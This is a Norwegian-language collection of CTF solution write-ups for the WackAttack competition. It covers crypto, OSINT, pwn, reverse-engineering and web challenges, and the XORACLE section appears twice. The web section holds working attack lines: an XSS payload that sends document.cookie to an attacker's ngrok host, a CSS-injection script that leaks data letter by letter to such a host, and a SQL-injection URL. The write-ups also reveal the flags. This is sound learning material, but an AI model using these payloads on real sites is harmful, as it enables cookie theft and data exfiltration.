# WACKATTACK

## CRYPTO

## XORACLE

### Oppgave

```
I just made this XORacle, I can show you how it works by encrypting a flag
ct: EQhnH1iOlSf9ERroV4QtRAm7M1utiz+yqiQu6CRorJ9LDWJy308=
If you want to encrypt anything, encrypt it here
```

Hele oppgaven finnes [her](crypto/smart xoracle/challenge.md)

### Løsning

```py
def encrypt(a, b):
    return b64encode(long_to_bytes(bytes_to_long(b64decode(a)) ^ bytes_to_long(b64decode(b))))
```
1. Vi vet allerede at flagget er 38 langt pga. **ct**: `a = b64encode(b'a'*38)`
1. Vi lager en kjent kode, **b** ved å sende **a** til krypterting.
1. Vi kan bruke **a** og **b** dette til å finne nøkkelen: `key = encrypt(a, b)`
1. Til slutt finner vi flagget: `flag = encrypt(key, ct)`

Vi får flagget i base64. Dekoder vi dette får vi flagget:
`b'd2Fja3tZMFVfV0gzcjNfODQ1MUM0MVlfNjFWM05fN0gzX0szWX0='`

<details>
<summary>Flagg</summary>

`wack{Y0U_WH3r3_8451C41Y_61V3N_7H3_K3Y}`
</details>


## TAKUJI CREEK

### Oppgave

Vi får et skjell der vi kan hente ut en decryptert flagg, eller velge å kryptere vår egen tekst. Krypteringsalgoritmen ser slik ut:
```py
def encrypt(data):
    data = bytes_to_long(data)
    print("data: ", data)
    output = 0
    while data != 0:
        output = output << 32
        randomnum = random.getrandbits(32)
        output += (data & 2**32-1) ^ randomnum
        print("random: ", randomnum)
        data = data >> 32
    return long_to_bytes(output)
```

Det interessante er er at algoritmen bruker en tilfeldig verdi på en slik måte at om vi ikke vet verdien er det umulig å finne ut hva originalteksten skulle vært.

Hele oppgaven finnes [her](crypto/takuji_creek/challenge.md)

### Løsning

Løsningen blir derfor å trene en modell på en mengde tilfeldige talslik at vi kan finne seeden til pythons randomfunksjon. Jeg bruker [MT19937Predictor](https://github.com/kmyk/mersenne-twister-predictor). Den trenger at vi trener modellen på 624 tall, så kan den forutsi de neste:

```py
from Crypto.Util.number import bytes_to_long, long_to_bytes
from pwn import *
from mt19937predictor import MT19937Predictor

io = remote('ctf.wackattack.eu', 5027)
predictor = MT19937Predictor()

# Train random model
print("Predicting ...")
for _ in range(624):
    io.sendline("1") # option 1 encrypt data
    io.sendlineafter(": ", "0") # use 0 as plaintext

    pt = 48 # bytes_to_long(0)
    ct = bytes_to_long(eval(io.recvuntil(b"\n", drop=True).decode('utf-8'))) # Read reply

    randomnum = pt ^ ct
    predictor.setrandbits(randomnum, 32)
```

Etter at vi har trent modellen kan vi også hente ut flagget:
```py
# Get encrypted flag
io.sendlineafter(">", "2") # option 1 encrypt data
encrypted_flag = bytes_to_long(eval(io.recvuntil(b"\n", drop=True).decode('utf-8'))) # Read reply
print(encrypted_flag)

io.close()
```

Ettersom vi nå har synket algoritmene vet vi nå hvilke tall som ble brukt for å kryptere flagget. Gjør vi xor- og bitshiftoperasjonene baklengs finner vi flagget:

```py
# Solve
block_count = ((len(bin(encrypted_flag))-2) // 32) # length of binary - prefix b0
print(block_count)

result = ""
for i in range(block_count):
    encrypted_block = (encrypted_flag >> 32*(block_count-i)) & 0xFFFFFFFF # Get one 32 bit chunk
    plaintext_block = encrypted_block ^ predictor.getrandbits(32) # Decrypt the block using the predicted random number

    result = bin(plaintext_block)[2:].zfill(32) + result # Prepend the result (binary)

def binary_to_text(binary_str):
    return ''.join([chr(int(binary_str[i:i+8], 2)) for i in range(0, len(binary_str), 8)])

print(binary_to_text(str(result))) # Convert the binary to text (the flag)
```

<details>
<summary>Flagg</summary>

`wack{N07_50_r4ND0M_4F73r_411}`
</details>


## XORACLE

### Oppgave

```
I just made this XORacle, I can show you how it works by encrypting a flag
ct: EQhnH1iOlSf9ERroV4QtRAm7M1utiz+yqiQu6CRorJ9LDWJy308=
If you want to encrypt anything, encrypt it here
```

Hele oppgaven finnes [her](crypto/xoracle/challenge.md)

### Løsning

```py
def encrypt(a, b):
    return b64encode(long_to_bytes(bytes_to_long(b64decode(a)) ^ bytes_to_long(b64decode(b))))
```
1. Vi vet allerede at flagget er 38 langt pga. **ct**: `a = b64encode(b'a'*38)`
1. Vi lager en kjent kode, **b** ved å sende **a** til krypterting.
1. Vi kan bruke **a** og **b** dette til å finne nøkkelen: `key = encrypt(a, b)`
1. Til slutt finner vi flagget: `flag = encrypt(key, ct)`

Vi får flagget i base64. Dekoder vi dette får vi flagget:
`b'd2Fja3tZMFVfV0gzcjNfODQ1MUM0MVlfNjFWM05fN0gzX0szWX0='`

<details>
<summary>Flagg</summary>

`wack{Y0U_WH3r3_8451C41Y_61V3N_7H3_K3Y}`
</details>



## MISC

## SPARQLING CONNECTIONS

### Oppgave

Vi får oppgitt en rekke krav om en person:

* There's an individual who shares academic lineage with Boltzmann.
* They went to a university in germany.
* They share surnames with someone who won a civillian merit award in France (an officer).
* In this group, they alone have their surname.
* Went to the oldest university in the group.

Hele oppgaven finnes [her](misc/sparqling_connections/challenge.md)

### Løsning

Navnet hinter til at vi skal bruke SPARQL Query: https://query.wikidata.org/

Vi legger inn alle kravene og sorterer etter alder på universitetene:

```SQL
SELECT ?person1Label ?person2Label ?awardLabel ?establishmentDate WHERE {
  
  ?person1 wdt:P184+ wd:Q84296.  # People advised
  ?person1 wdt:P734 ?surname1.  # Get the surname of the academic lineage person
  
  # University in Germany
  ?person1 wdt:P69 ?university.
  ?university wdt:P17 wd:Q183.
  ?university wdt:P571 ?establishmentDate.
  
  # All french civil awards
  ?person2 wdt:P166 ?award.    
  ?award wdt:P31 wd:Q618779.   # civilian award
  ?award wdt:P17 wd:Q142.      # from France
  ?person2 wdt:P734 ?surname2.

  # Join on the surname
  FILTER (?surname1 = ?surname2)
  
  SERVICE wikibase:label { bd:serviceParam wikibase:language "en". }
}
ORDER BY ?establishmentDate ?person1Label  # Sort by establishment date of university
```
Lenke til spørringen: [query.wikidata.org](https://query.wikidata.org/#SELECT%20%3Fperson1Label%20%3Fperson2Label%20%3FawardLabel%20%3FestablishmentDate%20WHERE%20%7B%0A%20%20%0A%20%20%3Fperson1%20wdt%3AP184%2B%20wd%3AQ84296.%20%20%23%20People%20advised%0A%20%20%3Fperson1%20wdt%3AP734%20%3Fsurname1.%20%20%23%20Get%20the%20surname%20of%20the%20academic%20lineage%20person%0A%20%20%0A%20%20%3Fperson1%20wdt%3AP69%20%3Funiversity.%20%20%23%20Person2%27s%20university%0A%20%20%3Funiversity%20wdt%3AP17%20wd%3AQ183.%20%20%23%20University%20must%20be%20in%20Germany%0A%20%20%3Funiversity%20wdt%3AP571%20%3FestablishmentDate.%20%20%23%20Get%20establishment%20date%20of%20the%20university%0A%20%20%0A%20%20%3Fperson2%20wdt%3AP166%20%3Faward.%20%20%20%20%23%20Received%20an%20award%0A%20%20%3Faward%20wdt%3AP31%20wd%3AQ618779.%20%20%20%23%20The%20award%20must%20be%20an%20instance%20of%20a%20%22civilian%20award%22%0A%20%20%3Faward%20wdt%3AP17%20wd%3AQ142.%20%20%20%20%20%20%23%20The%20award%20must%20be%20from%20France%20%28Q142%29%0A%20%20%3Fperson2%20wdt%3AP734%20%3Fsurname2.%20%23%20Get%20the%20surname%20of%20the%20award%20recipient%0A%0A%20%20%23%20Join%20on%20the%20surname%0A%20%20FILTER%20%28%3Fsurname1%20%3D%20%3Fsurname2%29%0A%20%20%0A%20%20%23%20Return%20labels%20for%20the%20matched%20results%0A%20%20SERVICE%20wikibase%3Alabel%20%7B%20bd%3AserviceParam%20wikibase%3Alanguage%20%22en%22.%20%7D%20%20%23%20Get%20labels%20in%20preferred%20language%0A%7D%0AORDER%20BY%20ASC%28%3FestablishmentDate%29%20%20%23%20Sort%20by%20establishment%20date%20of%20person2%27s%20university%0A).

Merk at `wdt:P184+` bruker `+` for gjøre et utvidet søk.

Vi får nå en [oversikt over alle som oppfyller kravene]. Etter litt rydding og fjerning av kopier står vi igjen med disse:

| Person                | Navnebrors utmerkelse                                                   |
|-----------------------|-------------------------------------------------------------------------|
|     Alexander Schmidt |     Honorary doctoral degree of the Pierre and   Marie Curie University |
|     Alexander Schmidt |     Honorary doctor of the Paris-Sorbonne   University                  |
|     Alexander Schmidt |     Q83550011                                                           |
|     Denis Vogel       |     Officer of the French Order of Academic Palms                       |
|     Klaus Werner      |     Q126416223                                                          |
|     Klaus Werner      |     Q126416243                                                          |
|     Oliver Thomas     |     Concours général                                                    |
|     Oliver Thomas     |     Meilleur Ouvrier de France                                          |
|     Oliver Thomas     |     Officer of the French Order of Academic Palms                       |
|     Oliver Thomas     |     resident at the Villa Medici                                        |
|     Oliver Thomas     |     Montyon Science Award                                               |
|     Oliver Thomas     |     Q57614016                                                           |
|     Oliver Thomas     |     honorary doctorate at the Lorraine university                       |
|     Oliver Thomas     |     Q126373749                                                          |
|     Oliver Thomas     |     honorary doctor of the University of Southern   Brittany            |
|     Oliver Thomas     |     Q126416237                                                          |
|     Peter Barth       |     doctor honoris causa from the University of   Paris                 |
|     Peter Barth       |     Doctor honoris causa of the University of   Strasbourg              |

Nå har vi kun 5 navn igjen, der to av navnebrødrene har fått en utmerkelse med **Officer** i navnet. Vi gjetter på disse to for å avgjøre om det er den ene eller den andre.

<details>
<summary>Flagg</summary>

`wack{Oliver Thomas}`
</details>


## THE GOPHERHOLE

### Oppgave

Hele oppgaven finnes [her](misc/the_gopherhole/challenge.md)

### Løsning

Løsningen her er å bruke grep injection på søket i Wack-Gopherhole.

Søker vi på wack får vi ikke opp noe. Legger vi deriomot til at flagget finnes i root får vi resultater:

```bash
wack /flag.txt
```

```
! Searching for wack /flag.txt
Poems containing wack /flag.txt:
       Found 1 poems
(FILE) flag.txt
```

Søket kan gjentas ved å legge til en og en bokstav helt til vi finner flagget.

Siden bokstavene i flagget skal bli til ord tar det ikke så lang tid å gjette seg frem.

<details>
<summary>Flagg</summary>

`wack{g0ph3r_1s_4w3s0m3}`
</details>



## OSINT

## AROUND THE WORLD

### Oppgave

Hele oppgaven finnes [her](osint/around_the_world/challenge.md)

### Løsning

https://data.edinburghcouncilmaps.info/datasets/cityofedinburgh::public-cctv-locations/about

https://maps.app.goo.gl/UGyAUKRMDUe62zgx8

<details>
<summary>Flagg</summary>

`wack{55.9511,-3.1756}`
</details>


## GRAVEYARD SHIFT

### Oppgave

Hele oppgaven finnes [her](osint/graveyard_shift/challenge.md)

### Løsning



<details>
<summary>Flagg</summary>

`wack{Alter Südfriedhof}`
</details>


## OLD GAMER

### Oppgave

Her får vi ingen vedlegg, så navn på author er alt vi har å gå etter.

Hele oppgaven finnes [her](osint/old_gamer/challenge.md)

### Løsning

https://steamcommunity.com/profiles/76561198203700860/screenshots/

<details>
<summary>Flagg</summary>

`wack{0bl1v1on_1s_b3tter}`
</details>



## PWN

## DICE GAME

### Oppgave

Oppgaven er en buffer overflow:
```c
long unsigned int balance = 30;
int seed = 7; // for good luck
int strength = 0;
printf("Let's play a game!\nThe entry fee is 10, but if you roll 16 you win everything i have!\n\n");
printf("First we need to tune our setup. How hard do you plan on rolling the dice (on a scale from 1-100)?\n");
scanf("%lu", &strength);
getchar();
if (strength > 50) {
    printf("Wow that's strong... Let me increase the table length real quick!\n");
    sleep(3);
}
```
Hele oppgaven finnes [her](pwn/dice_game/challenge.md)

### Løsning

Skriv inn et høyt tall. F.eks. 111111111111111111
Seed vil da bli overskrevet slik at du kan nå tall over 7. Balance vil også bli større, noe som gjør at du kan prøve mange ganger. Trykk **y** på neste så får du flagget etter et par forsøk. 

<details>
<summary>Flagg</summary>

`wack{such_sk1ll_4nd_5uch_luck}`
</details>



## REV

## NUMERICAL FLAG CHECKER

### Oppgave

```py
import numpy as np
import sys

print=len
â = lambda å: ((81*å)%1024)>>2
assert len(sys.argv) > 1
remote=np.array
i = sys.argv[1]
l = (remote([sum(f) for f in list(zip((ord(e) for e in i),[5]*len(i)))]))
assert sum(l) < 145**len(l)
sum = np.random.randint
assert len(l) == 3*5+2**2+int((1j**4).real)
bin= lambda k: k+bin(k-1) if k > 0 else 0
np.random.seed(l[0])
a = {"size":print(l)}
k = sum(0, 183, **a)
assert l[3:][k[:-3]%4==3][0]==115
assert ((l[3:][k[:-3]%4==0])^-4 == remote([-116,-114,-119,-126,-104,-106])).all()
assert (â(l[3:][k[:-3]%4==2]) == remote([0o317, int(hex(105)[2:]), bin(19) + bin(3) +bin(2) - bin(1), 70+2])).all()
assert (l[3:][k[:-3]%4==1]**3-2 == remote([int(a) for a in "20971503181584631574623195110399999831685157".split("3")])).all()
sys.stdout.write(f"{sys.argv[1]} is the correct flag\n")
```

Hele oppgaven finnes [her](rev/numerical_flag_checker/challenge.md)

### Løsning

Forenkler steg for steg til jeg klarer å finne k. Regner da ut disse utrykkene: `k[:-3]%4==2` og ender opp med dette:
```py
import numpy as np
import sys

â = lambda å: ((81*å)%1024)>>2

flag = sys.argv[1]
l = np.array( ord(e)+5 for e in flag )

assert sum(l) < 145**20 # 16879518141852355308321632423496246337890625
assert len(l) == 20

np.random.seed(124)
k = np.array([156,17,135,169,64,116,20,28,21,149,73,94,46,48,137,66,146,0,0,0])

assert l[3:][   np.array([False, False,  True, False, False, False, False, False, False, False, False, False, False, False, False, False, False])][0] == 115
assert ((l[3:][ np.array([ True, False, False, False,  True,  True,  True,  True, False, False, False, False, False,  True, False, False, False])])   == np.array([112,114,117,126,100,106])).all()
assert (â(l[3:][np.array([False, False, False, False, False, False, False, False, False, False, False,  True,  True, False, False, True,  True])])    == np.array([207, 69, 198, 72])).all()
assert (l[3:][  np.array([False,  True, False,  True, False, False, False, False,  True,  True,  True, False, False, False,  True, False, False])]    == np.array([128, 122, 54, 58, 100, 119])).all()

print(f"{flag} is the correct flag")
```

Herifra er det bare å regne ut ett og ett tall og substituere til du finner flagget.

<details>
<summary>Flagg</summary>

`wack{numpy_15_w1erD}`
</details>



## WEB

## FREE WIFI

### Oppgave

Oppgaven går ut på å sende en request til nodeserveren, men bruke lang tid (2000ms-3000ms)

Hele oppgaven finnes [her](web/free_wifi/challenge.md)

### Løsning

```py
import http.client
import time

conn = http.client.HTTPConnection("ctf.wackattack.eu:5010")
conn.request("GET", "/", headers={'Transfer-Encoding': 'chunked'})

conn.send(b"5\r\nstart\r\n")
time.sleep(2)
conn.send(b"0\r\n\r\n") # 0 content means done

response = conn.getresponse()
print(f"Response: {response.status} {response.reason}\n{response.read().decode('utf-8')}")
conn.close()

```

<details>
<summary>Flagg</summary>

`wack{sL0w_1s_7he_n3w_f4s7}`
</details>


## FUN SQL

### Oppgave

```go
textSearch = strings.Replace(textSearch, "'", "''", len(textSearch)/2)

rows, err := db.Query(fmt.Sprintf("SELECT data FROM notes WHERE public = 1 AND data LIKE '%s'", textSearch))
```

Hele oppgaven finnes [her](web/fun_sql/challenge.md)

### Løsning

http://ctf.wackattack.eu:5020/?text=''''''''''''''%20OR%201==1---

<details>
<summary>Flagg</summary>

`wack{n0_sQlm4ap_4ll0w3d}`
</details>


## LOVE LETTER

### Oppgave

Hele oppgaven finnes [her](web/love_letter/challenge.md)

### Løsning

Python med ngrok for å ta imot request:
```bash
ngrok http 5000
```
```py
from flask import Flask
app = Flask(__name__)

@app.route('/')
def index():
    return "Thanks!"

if __name__ == '__main__':
    app.run(port=5000)  # Run the app on port 5000
```

Vi legger inn en XSS som vi kan nå etterpå. `Message` kan være hva som helst, men vi limer dette inn i navn:

```js
" onload=fetch('https://d266-158-112-20-142.ngrok-free.app'?+document.cookie)
```

Etter at vi har plassert brevet kan vi nå det fra review siden slik:

```bash
`curl -X POST http://ctf.wackattack.eu:5021/review/23c3afae-ee5f-447e-a0cd-afc5452a09ac`
```

Requesten trigger da en request til vår tjener gjennom XSS og ngrok. Flagget dukker da opp i Flask-loggen:
`[19/Oct/2024 01:57:13] "GET /?flag=wack{******} HTTP/1.1" 200 -`

<details>
<summary>Flagg</summary>

`wack{xss_my_l0v3_4nd_but7er}`
</details>


## REDIRECTED

### Oppgave

Hele oppgaven finnes [her](web/redirected/challenge.md)

### Løsning

Den redirecter med en gang, så vi bruker curl:

```bash
curl http://ctf.wackattack.eu:5022/flag
```

<details>
<summary>Flagg</summary>

`wack{sUp3rL0n6F1a6F0rU20UcAn7R3m3mb3r1t}`
</details>


## STYLISH

### Oppgave

Oppgaven går ut på å bruke CSS injection til å hente ut flagget.

Hele oppgaven finnes [her](web/stylish/challenge.md)

### Løsning

Vi kan sende requests til http://ctf.wackattack.eu:5023/ for å lage payloads, før vi må til http://ctf.wackattack.eu:5023/review for å bruke den på flagget.

Målet er å få tak i id-en til textarea-feltet, fordi dette er flagget.

Først setter jeg opp python + ngrok for å ta imot data:
```bash
ngrok http 5000
```

```py
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def index():
    print(request.args.get('l'))
    return "Thanks!"

if __name__ == '__main__':
    app.run(port=5000)  # Run the app on port 5000
```

CSS-payloaden kan settes opp slik:
```css
textarea[id^=wack\7Ba]{background: url(https://5e42-158-112-20-145.ngrok-free.app?l=a);}
textarea[id^=wack\7Bb]{background: url(https://5e42-158-112-20-145.ngrok-free.app?l=b);}
textarea[id^=wack\7Bc]{background: url(https://5e42-158-112-20-145.ngrok-free.app?l=c);}
```
Dette gjør at dersom første bokstav (etter wack{) er en `a`, vil pythonservenen min motta en `a`. Dette kan gjentas for alle bokstaver, tall og lovlige tegn: `[A-Za-z0-9_?!]+`.

Deretter gjentas det samme, bare at vi har mer plaintekst.

Jeg valgte å ikke bruke tid på å automatisere requests, men brukte valgte heller å løse for en og en bokstav manuelt:

```py
from flask import Flask, request
import string

all_characters = string.ascii_lowercase + string.digits + "-" + "_" + "?" + "!"

def generateCSS(known):
    css = ""
    for letter in list(all_characters):
        css += (f"textarea[id^=wack\\7B{known+letter}]{{background: url(https://5e42-158-112-20-145.ngrok-free.app?l={known+letter});}}\n")
    print(css)

generateCSS(known)

app = Flask(__name__)
@app.route('/')
def index():
    print("mnew letter!")
    
    known = str(request.args.get('l'))
    
    generateCSS(known)

    return "Thanks!"
```

Scriptet returnerer en haug med css. Jeg limer det inn i textarea på siden og caller på `review` med curl.

```bash
curl -X POST http://ctf.wackattack.eu:5023/review -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiZDZjMTk5OTMtNzc0ZC00OTlmLTg2NTAtNTFlZWZjZTI5NDkyIn0.G44aqNrsjCpywWAjTL1v4DaFoq98uS698u4pqh75zGs"
```

Prosessen gjentas til vi har fått hele flagget.

<details>
<summary>Flagg</summary>

`wack{styl1sh_3xpl0its_1s_c00l}`
</details>


